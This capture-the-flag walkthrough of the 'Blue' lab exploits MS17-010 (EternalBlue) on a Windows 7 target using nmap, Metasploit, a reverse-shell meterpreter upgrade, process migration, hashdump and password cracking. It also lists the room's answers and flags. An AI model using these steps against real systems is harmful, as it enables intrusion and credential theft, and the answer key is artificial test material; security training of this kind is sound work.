#Blue
```
Joe Vinyard | 20200604
```
#IP Address
```
export IP=10.10.76.210
```
#Initial Nmap
```
nmap -sC -sV -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-04 15:08 EDT
Nmap scan report for 10.10.76.210
Host is up (0.21s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h39m58s, deviation: 2h53m12s, median: -2s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:6f:bb:fe:6f:56 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-06-04T14:09:27-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-04T19:09:27
|_  start_date: 2020-06-04T19:05:55

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.08 seconds
```
#Nmap Vuln Scan
```
nmap -sV -vv -sC --script vuln -oN nmap/vuln $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-04 15:11 EDT
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 15:11
NSE Timing: About 87.50% done; ETC: 15:11 (0:00:04 remaining)
Completed NSE at 15:11, 35.16s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 15:11
Completed NSE at 15:11, 0.00s elapsed
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Initiating Ping Scan at 15:11
Scanning 10.10.76.210 [2 ports]
Completed Ping Scan at 15:11, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:11
Completed Parallel DNS resolution of 1 host. at 15:11, 0.01s elapsed
Initiating Connect Scan at 15:11
Scanning 10.10.76.210 [1000 ports]
Discovered open port 139/tcp on 10.10.76.210
Discovered open port 135/tcp on 10.10.76.210
Discovered open port 445/tcp on 10.10.76.210
Discovered open port 3389/tcp on 10.10.76.210
Discovered open port 49160/tcp on 10.10.76.210
Discovered open port 49158/tcp on 10.10.76.210
Discovered open port 49152/tcp on 10.10.76.210
Discovered open port 49153/tcp on 10.10.76.210
Discovered open port 49154/tcp on 10.10.76.210
Completed Connect Scan at 15:11, 9.61s elapsed (1000 total ports)
Initiating Service scan at 15:11
Scanning 9 services on 10.10.76.210
Service scan Timing: About 55.56% done; ETC: 15:13 (0:00:46 remaining)
Completed Service scan at 15:12, 62.43s elapsed (9 services on 1 host)
NSE: Script scanning 10.10.76.210.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 15:12
NSE: [firewall-bypass 10.10.76.210] lacks privileges.
Completed NSE at 15:13, 30.03s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 15:13
NSE: [tls-ticketbleed 10.10.76.210:139] Not running due to lack of privileges.
Completed NSE at 15:13, 1.02s elapsed
Nmap scan report for 10.10.76.210
Host is up, received conn-refused (0.21s latency).
Scanned at 2020-06-04 15:11:40 EDT for 104s
Not shown: 991 closed ports
Reason: 991 conn-refused
PORT      STATE SERVICE       REASON  VERSION
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp   open  microsoft-ds  syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Service
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_sslv2-drown: 
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49160/tcp open  msrpc         syn-ack Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 15:13
Completed NSE at 15:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 15:13
Completed NSE at 15:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.97 seconds
```
#Task 1 Recon
1. Scan machine.
```
no answer needed
```
2. How many ports are open with a port number under 1000?
```
3
```
3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
```
ms17-010
```

#Task 2 Gain Access
1. Start Metasploit
```
no answer needed
```
2. Find the exploitation code we will run against the machine.  What is the full path of the code? (Ex: exploit/.......)
```
exploit/windows/smb/ms17_010_eternalblue
```
3. Show options and set the one required value.  What is the name of this value? (All caps for submission)
```	
RHOSTS	
```
4. Run the exploit.
```
no answer needed
```
5. Confirm that the exploit has run correctly.  You may have to press enter for the DOS shell to appear. Backgroud this shell (CTRL + Z).  If this failed, you may have to reboot the target VM.  Try running it again before reboot of the target.
```
no answer needed
```

#Task 3 Escalate
1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
```
Name of post module to upgrade from command to meterpreter shell:

post/multi/manage/shell_to_meterpreter
```
2. Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)
```
SESSION
```
3. Set the required option, you may need to list all of the sessions to fid you target here.
```
no answer needed

set SESSION 1
```
4. Run!  If this doesn't work, try completeing the exploit from the previous task once more.
```
no answer needed
```
5. Once the meterpreter shell conversion completes, select that session for use.
```
no answer needed

msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) > sessions -i

Active sessions
===============

  Id  Name  Type               Information                           Connection
  --  ----  ----               -----------                           ----------
  1         shell x64/windows  Microsoft Windows [Version 6.1.7601]  10.2.13.68:4444 -> 10.10.76.210:49195 (10.10.76.210)

msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.2.13.68:4433 
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (176195 bytes) to 10.10.76.210
s[*] Meterpreter session 2 opened (10.2.13.68:4433 -> 10.10.76.210:49203) at 2020-06-04 15:32:06 -0400
sessions

Active sessions
===============

  Id  Name  Type                     Information                           Connection
  --  ----  ----                     -----------                           ----------
  1         shell x64/windows        Microsoft Windows [Version 6.1.7601]  10.2.13.68:4444 -> 10.10.76.210:49195 (10.10.76.210)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC          10.2.13.68:4433 -> 10.10.76.210:49203 (10.10.76.210)

msf5 post(multi/manage/shell_to_meterpreter) > 
[*] Stopping exploit/multi/handler
sessions

Active sessions
===============

  Id  Name  Type                     Information                           Connection
  --  ----  ----                     -----------                           ----------
  1         shell x64/windows        Microsoft Windows [Version 6.1.7601]  10.2.13.68:4444 -> 10.10.76.210:49195 (10.10.76.210)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC          10.2.13.68:4433 -> 10.10.76.210:49203 (10.10.76.210)

msf5 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

```
6. Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 
```
no answer needed

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > shell
Process 2472 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
7. List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
```
PID  PPID  Name          Arch  Session  User                 Path
 ---  ----  ----          ----  -------  ----                 ----
 656  596   winlogon.exe  x64   1        NT AUTHORITY\SYSTEM  C:\Windows\System32\winlogon.exe

```
8. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 
```
meterpreter > migrate -N winlogon.exe
[*] Migrating from 1968 to 656...
[*] Migration completed successfully.
```

#Task 4 Cracking

Dump the non-default user's password and crack it!

1. Within out elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
```
Jon
```
2. Copy this password hash to a file and research how to crack it.  What is the cracked password?
```
hash: ffb43f0de35be4d9917ac0cc8ad57f8d (ran through online hash cracker)

password: alqfna22
```

#Task 5 Find Flags!

```
Found location of all three flags with 'search' command inside meterpreter:

meterpreter > search -f flag*.txt
Found 3 results...
    c:\flag1.txt (24 bytes)
    c:\Users\Jon\Documents\flag3.txt (37 bytes)
    c:\Windows\System32\config\flag2.txt (34 bytes)
```

1. Flag1? (Only submit the flag contents {CONTENTS})
```
{access_the_machine}
```
2. Flag2? *Errata: Windows really doesn't like the location of this flag and can occasionally delete it.  It may be necessary in come cases to terminiate/restart the machine and rerun the exploit to find this flag.  This is relatively rare, however, it can happen.*
```
{sam_database_elevated_access}
```
3. flag3?
```
{admin_documents_can_be_valuable}
```
